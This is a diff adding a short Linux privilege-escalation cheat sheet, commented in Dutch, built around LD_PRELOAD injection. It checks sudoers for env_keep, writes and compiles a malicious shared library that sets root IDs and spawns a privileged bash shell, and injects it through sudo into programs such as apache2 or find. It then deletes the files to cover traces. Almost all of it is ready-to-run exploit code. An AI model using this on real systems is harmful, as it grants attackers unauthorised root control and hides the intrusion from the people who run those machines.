@@ -1,0 +1,25 @@
+# LD_PRELOAD Shared Library Injection - Linux privilege escalation
+# Stap 1: Check of LD_PRELOAD mogelijk is (env_keep in sudoers)
+sudo -l
+# Zoek naar: env_keep += LD_PRELOAD
+# Stap 2: Maak malicious shared library
+cat > /tmp/evil.c << 'PAYLOAD'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+PAYLOAD
+# Stap 3: Compileer
+gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
+# Stap 4: Inject in SUID/sudo binary
+sudo LD_PRELOAD=/tmp/evil.so /usr/bin/apache2
+# Of elk programma dat je met sudo mag draaien:
+sudo LD_PRELOAD=/tmp/evil.so find
+# Stap 5: Opruimen
+rm /tmp/evil.so /tmp/evil.c
+# Tip: Werkt alleen als env_keep LD_PRELOAD bevat in sudoers
+# Tip: Sommige binaries negeren LD_PRELOAD (setuid bit check)
